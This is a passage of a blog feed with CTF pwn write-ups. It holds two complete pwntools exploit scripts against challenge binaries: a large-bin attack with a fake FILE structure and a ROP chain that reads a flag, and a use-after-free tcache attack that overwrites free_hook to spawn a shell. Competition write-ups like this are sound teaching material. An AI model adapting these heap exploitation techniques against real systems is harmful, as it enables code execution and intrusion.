class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1e6690</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1e38a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base<br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e5280</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x520</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">2</span>)<br><br>show(<span class="hljs-number">2</span>)<br>heap = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x290</span><br>lg(<span class="hljs-string">&#x27;heap&#x27;</span>, heap)<br><br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x510</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x540</span>)<br><br>show(<span class="hljs-number">0</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1e4030</span><br>get_gadgets(libc_base)<br><br>pop_rdi_ret = libc_base + <span class="hljs-number">0x000000000002858f</span><br>pop_rsi_ret = libc_base + <span class="hljs-number">0x000000000002ac3f</span><br>pop_rdx_rbx_ret = libc_base + <span class="hljs-number">0x00000000001597d6</span><br>pop_rax_ret = libc_base + <span class="hljs-number">0x0000000000045580</span><br>syscall_ret = libc_base + <span class="hljs-number">0x00000000000611ea</span><br>ret = pop_rdi_ret + <span class="hljs-number">1</span><br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = p64(leak) * <span class="hljs-number">2</span> + p64(heap + <span class="hljs-number">0x290</span>) + p64(_IO_list_all - <span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>, payload)<br><br>add(<span class="hljs-number">6</span>, <span class="hljs-number">0x540</span>)<br><br>fake_IO_file_addr = heap + <span class="hljs-number">0xce0</span><br>fake_IO_addr = fake_IO_file_addr<br>data = fake_IO_file_addr + <span class="hljs-number">0x380</span><br>flag_addr = fake_IO_file_addr + <span class="hljs-number">0x300</span><br><span class="hljs-comment"># mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; </span><br>magic_gadget = libc_base + <span class="hljs-number">0x000000000014b760</span><br><br>fake_IO_file = flat(&#123;<br>    <span class="hljs-number">0</span>:&#123;<br>        <span class="hljs-number">0x8</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># next_free</span><br>        <span class="hljs-number">0x10</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chunk_limit</span><br>        <span class="hljs-number">0x18</span>: <span class="hljs-number">1</span>,<span class="hljs-comment"># _IO_write_ptr</span><br>        <span class="hljs-number">0x20</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># _IO_write_end</span><br>        <span class="hljs-number">0x28</span>: magic_gadget,<span class="hljs-comment"># gadget</span><br>        <span class="hljs-number">0x38</span>: fake_IO_file_addr + <span class="hljs-number">0x100</span>,<span class="hljs-comment"># rdi = &amp;&#x27;/bin/sh\x00&#x27;</span><br>        <span class="hljs-number">0x40</span>: <span class="hljs-number">1</span>,<br>        <span class="hljs-number">0x58</span>: <span class="hljs-number">0</span>,<span class="hljs-comment"># chain</span><br>        <span class="hljs-number">0x78</span>: _IO_stdfile_2_lock,<span class="hljs-comment"># _IO_stdfile_1_lock</span><br>        <span class="hljs-number">0x90</span>: _IO_wide_data_1,<span class="hljs-comment"># _IO_wide_data_2</span><br>        <span class="hljs-number">0xc8</span>: _IO_obstack_jumps + <span class="hljs-number">0x20</span>,<br>        <span class="hljs-number">0xd0</span>: fake_IO_addr<span class="hljs-comment"># obstack(B)</span><br>    &#125;, <br>    <span class="hljs-number">0xf0</span>:&#123;<br>        <span class="hljs-number">0</span>: [<br>            <span class="hljs-number">0</span>,<br>            fake_IO_file_addr + <span class="hljs-number">0x100</span>,<br>            <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>            setcontext + <span class="hljs-number">61</span><br>        ],<br>        <span class="hljs-number">0xa0</span>: fake_IO_file_addr + <span class="hljs-number">0x200</span>,<br>        <span class="hljs-number">0xa8</span>: ret<br>    &#125;,<br>    <span class="hljs-number">0x1f0</span>:<br>        [<br>            pop_rax_ret,  <span class="hljs-comment"># sys_open(&#x27;flag&#x27;, 0)</span><br>            <span class="hljs-number">2</span>,<br>            pop_rdi_ret,<br>            flag_addr,<br>            pop_rsi_ret,<br>            <span class="hljs-number">0</span>,<br>            syscall_ret,<br><br>            pop_rax_ret,  <span class="hljs-comment"># sys_read(flag_fd, heap, 0x100)</span><br>            <span class="hljs-number">0</span>,<br>            pop_rdi_ret,<br>            <span class="hljs-number">3</span>,<br>            pop_rsi_ret,<br>            data,<br>            pop_rdx_rbx_ret,<br>            <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0</span>,<br>            syscall_ret,<br><br>            pop_rax_ret,  <span class="hljs-comment"># sys_write(1, heap, 0x100)</span><br>            <span class="hljs-number">1</span>,<br>            pop_rdi_ret,<br>            <span class="hljs-number">1</span>,<br>            pop_rsi_ret,<br>            data,<br>            pop_rdx_rbx_ret,<br>            <span class="hljs-number">0x40</span>,<br>            <span class="hljs-number">0</span>,<br>            syscall_ret<br>        ],<br>    <span class="hljs-number">0x2f0</span>: <span class="hljs-string">&#x27;flag\x00\x00\x00\x00&#x27;</span>,<br>&#125;, filler=<span class="hljs-string">&#x27;\x00&#x27;</span><br>)<br><br>payload = fake_IO_file<br>edit(<span class="hljs-number">2</span>, payload)<br><br>_exit()<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe note"></a>safe note</h3><p>白给的uaf。tcache bin attack覆盖free_hook为system。</p><p>需要注意的一点是，libc2.32及以上版本都对fd指针进行了异或加密。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>fn = <span class="hljs-string">&#x27;./vuln&#x27;</span><br>elf = ELF(fn)<br>libc = elf.libc<br><br>debug = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> debug:<br>    p = remote(<span class="hljs-string">&#x27;week-4.hgame.lwsec.cn&#x27;</span>, <span class="hljs-number">30776</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(fn)<br><br>lg = <span class="hljs-keyword">lambda</span> x, y: log.success(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;x&#125;</span>: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(y)&#125;</span>&#x27;</span>)<br><br>sd = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)<br><br>rv = <span class="hljs-keyword">lambda</span> x: p.recv(x)<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>rt = <span class="hljs-keyword">lambda</span> x: p.can_recv_raw(timeout=x)<br><br><br>malloc_hook, free_hook = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>system, execve, binsh = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>setcontext, mprotect = <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_<span class="hljs-built_in">open</span>, read, write = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_list_all,  _IO_stdfile_2_lock, _IO_wide_data_1 = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps = <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br>_IO_wfile_jumps_mmap = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_gadgets</span>(<span class="hljs-params">libc_base</span>):<br>    <span class="hljs-keyword">global</span> malloc_hook, free_hook, binsh, system, execve, setcontext, _<span class="hljs-built_in">open</span>, read, write, mprotect<br>    <span class="hljs-keyword">global</span>  _IO_list_all, _IO_stdfile_2_lock, _IO_wide_data_1<br>    <span class="hljs-keyword">global</span> _IO_file_jumps, _IO_wfile_jumps, _IO_cookie_jumps, _IO_obstack_jumps, _IO_wfile_jumps_mmap<br><br>    free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>    <br>    binsh = libc_base + libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>).__next__()<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    execve = libc_base + libc.sym[<span class="hljs-string">&#x27;execve&#x27;</span>]<br>    <br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>    <br>    _<span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    _IO_list_all = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]<br>    <br>    _IO_stdfile_2_lock = libc_base + <span class="hljs-number">0x1e6690</span><br>    _IO_wide_data_1 = libc_base + <span class="hljs-number">0x1e38a0</span><br>    _IO_file_jumps = libc_base<br>    _IO_wfile_jumps = libc_base<br>    _IO_wfile_jumps_mmap = libc_base<br>    _IO_obstack_jumps = libc_base + <span class="hljs-number">0x1e5280</span><br>    _IO_cookie_jumps = libc_base<br><br>    <br>    log.success(<span class="hljs-string">&#x27;libc_base: &#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>    log.success(<span class="hljs-string">&#x27;malloc_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(malloc_hook))<br>    log.success(<span class="hljs-string">&#x27;free_hook: &#x27;</span> + <span class="hljs-built_in">hex</span>(free_hook))<br>    log.success(<span class="hljs-string">&#x27;system: &#x27;</span> + <span class="hljs-built_in">hex</span>(system))<br>    log.success(<span class="hljs-string">&#x27;execve: &#x27;</span> + <span class="hljs-built_in">hex</span>(execve))<br>    log.success(<span class="hljs-string">&#x27;setcontext: &#x27;</span> + <span class="hljs-built_in">hex</span>(setcontext))<br>    log.success(<span class="hljs-string">&#x27;mprotect: &#x27;</span> + <span class="hljs-built_in">hex</span>(mprotect))<br>    log.success(<span class="hljs-string">&#x27;IO_llist_all: &#x27;</span> + <span class="hljs-built_in">hex</span>(_IO_list_all))<br><br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cry</span>):<br>    ans = cry<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        ans = (ans &gt;&gt; <span class="hljs-number">12</span>) ^ cry<br>    <span class="hljs-keyword">return</span> ans<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index, size</span>):<br>    menu(<span class="hljs-number">1</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, content</span>):<br>    menu(<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>, content)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    menu(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_exit</span>():<br>    menu(<span class="hljs-number">5</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x20</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(i)<br><br>show(<span class="hljs-number">6</span>)<br>leak = u64(rv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>key = decrypt(leak) &gt;&gt; <span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;key&#x27;</span>, key)<br><br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0xf0</span>)<br>show(<span class="hljs-number">7</span>)<br>leak = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>lg(<span class="hljs-string">&#x27;leak&#x27;</span>, leak)<br>libc_base = leak - <span class="hljs-number">0x1e3c80</span><br>get_gadgets(libc_base)<br><br>edit(<span class="hljs-number">6</span>, p64(key ^ free_hook))<br><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x80</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x80</span>)<br><br>edit(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>edit(<span class="hljs-number">11</span>, p64(system))<br><br>delete(<span class="hljs-number">8</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022-hgame-week2</title>
    <link href="/2023/02/06/2022-hgame-week2/"/>
    <url>/2023/02/06/2022-hgame-week2/</url>
    
